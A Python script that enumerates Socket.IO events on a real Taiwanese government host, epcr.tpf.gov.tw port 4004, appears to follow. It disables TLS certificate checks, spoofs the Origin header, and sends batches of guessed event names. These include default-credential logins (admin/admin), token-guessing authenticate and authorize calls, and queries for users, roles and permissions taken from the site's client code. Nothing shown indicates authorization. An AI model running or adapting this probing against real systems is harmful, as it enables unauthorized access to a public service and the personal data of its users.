#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""4004 Socket.IO WebSocket 业务事件穷举测试（事件名变体+Authorization 注入）"""
import socket, ssl, time, json, base64, struct, os

HOST = "epcr.tpf.gov.tw"
PORT = 4004


def ws_handshake(host, port, path):
    sock = socket.create_connection((host, port), timeout=10)
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    ssock = ctx.wrap_socket(sock, server_hostname=host)
    key = base64.b64encode(os.urandom(16)).decode()
    crlf = "\r\n"
    req = (
        "GET " + path + " HTTP/1.1" + crlf +
        "Host: " + host + ":" + str(port) + crlf +
        "Upgrade: websocket" + crlf +
        "Connection: Upgrade" + crlf +
        "Sec-WebSocket-Key: " + key + crlf +
        "Sec-WebSocket-Version: 13" + crlf +
        "Sec-WebSocket-Protocol: socket.io" + crlf +
        "Origin: https://epcr.tpf.gov.tw" + crlf +
        crlf
    )
    ssock.send(req.encode())
    response = b""
    while b"\r\n\r\n" not in response:
        chunk = ssock.recv(4096)
        if not chunk:
            break
        response += chunk
    if b"101 Switching Protocols" not in response:
        print("[!] WS handshake failed")
        ssock.close()
        return None
    return ssock


def ws_recv(ssock, timeout=3):
    ssock.settimeout(timeout)
    try:
        h = ssock.recv(2)
        if len(h) < 2:
            return None
        b1, b2 = h[0], h[1]
        opcode = b1 & 0x0f
        length = b2 & 0x7f
        if length == 126:
            ext = ssock.recv(2)
            length = struct.unpack(">H", ext)[0]
        elif length == 127:
            ext = ssock.recv(8)
            length = struct.unpack(">Q", ext)[0]
        payload = b""
        while len(payload) < length:
            chunk = ssock.recv(length - len(payload))
            if not chunk:
                break
            payload += chunk
        return opcode, payload
    except socket.timeout:
        return None


def ws_send(ssock, text):
    data = text.encode()
    mask = os.urandom(4)
    masked = bytes(b ^ mask[i % 4] for i, b in enumerate(data))
    header = bytes([0x81])
    if len(data) < 126:
        header += bytes([0x80 | len(data)])
    elif len(data) < 65536:
        header += bytes([0x80 | 126]) + struct.pack(">H", len(data))
    else:
        header += bytes([0x80 | 127]) + struct.pack(">Q", len(data))
    ssock.send(header + mask + masked)


def test_events(events, label="Test"):
    print("\n=== " + label + " ===")
    ws = ws_handshake(HOST, PORT, "/socket.io/?EIO=4&transport=websocket")
    if not ws:
        return
    msg = ws_recv(ws, timeout=3)
    if msg:
        opcode, payload = msg
        text = payload.decode(errors='replace')
        print("Handshake: " + text[:150])
    ws_send(ws, "40")
    msg = ws_recv(ws, timeout=3)
    if msg:
        opcode, payload = msg
        print("CONNECT: " + payload.decode(errors='replace')[:100])
    for ev in events:
        ws_send(ws, ev)
        time.sleep(0.5)
        msg = ws_recv(ws, timeout=2)
        if msg:
            opcode, payload = msg
            text = payload.decode(errors='replace')
            print("  " + ev[:50] + " -> " + text[:150])
        else:
            print("  " + ev[:50] + " -> (silent timeout)")
    ws.close()


def main():
    # 测试 1: 经典事件名（Socket.IO 通用）
    test_events([
        '42["subscribe",{}]',
        '42["unsubscribe",{}]',
        '42["join",{"room":"test"}]',
        '42["leave",{}]',
        '42["message",{"data":"test"}]',
        '42["chat",{"msg":"test"}]',
        '42["emit",{"data":"test"}]',
        '42["event","test"]',
    ], "测试 1: 通用事件名")

    # 测试 2: 认证相关事件
    test_events([
        '42["login",{"username":"admin","password":"admin"}]',
        '42["authenticate",{"token":"anonymous"}]',
        '42["auth",{}]',
        '42["token","anonymous"]',
        '42["authorize",{"token":"admin"}]',
        '42["refresh",{}]',
        '42["validate",{"token":"test"}]',
        '42["session",{}]',
    ], "测试 2: 认证事件")

    # 测试 3: 业务事件（基于 AuthService.js + 13 个角色）
    test_events([
        '42["getUser",{}]',
        '42["getUserInfo",{}]',
        '42["getActivities",{}]',
        '42["getPermissions",{}]',
        '42["getRoles",{}]',
        '42["checkToken",{}]',
        '42["userInfo",{}]',
        '42["whoami",{}]',
    ], "测试 3: 用户/角色查询事件")

    # 测试 4: SocketIoService.js 客户端事件名
    test_events([
        '42["client.subscribe",{"roomName":"test"}]',
        '42["client.unsubscribe",{"roomName":"test"}]',
        '42["client.login",{}]',
        '42["client.authenticate",{}]',
        '42["server.subscribe",{}]',
        '42["server.broadcast",{}]',
    ], "测试 4: client.* / server.* 事件")


if __name__ == "__main__":
    main()